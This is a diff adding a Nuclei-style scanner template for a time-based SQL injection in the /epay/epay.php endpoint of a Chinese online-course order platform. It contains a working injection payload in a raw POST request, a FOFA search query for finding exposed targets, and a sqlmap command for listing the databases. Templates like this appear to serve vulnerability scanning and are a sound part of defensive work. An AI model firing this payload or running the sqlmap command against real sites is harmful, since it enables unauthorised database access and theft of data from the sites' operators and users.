@@ -1,0 +1,34 @@
+id: 29wangkepay-epay-sqli
+
+info:
+  name: 29 网课交单平台 epay.php - sqli
+  author: leadlife
+  severity: high
+  description: 29 网课交单平台 /epay/epay.php接口处存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
+  reference:
+    - https://github.com/wy876/POC/blob/main/29%E7%BD%91%E8%AF%BE%E4%BA%A4%E5%8D%95%E5%B9%B3%E5%8F%B0epay.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-qeury: body="你在看什么呢？我写的代码好看吗"
+    tips: out_trade_no=*
+    sqlmap: sqlmap -r sql.txt --dbs --random-agent
+  tags: 29wangkepay,sqli,time
+
+http:
+  - raw:
+      - |-
+        @timeout: 15s
+        POST /epay/epay.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 103
+        Content-Type: application/x-www-form-urlencoded
+
+        out_trade_no=%27+AND+%28SELECT+8078+FROM+%28SELECT%28SLEEP%286%29%29%29eEcA%29+AND+%27aEmC%27%3D%27aEmC
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+          - contains(body,"alipaysubmit")
+        condition: and
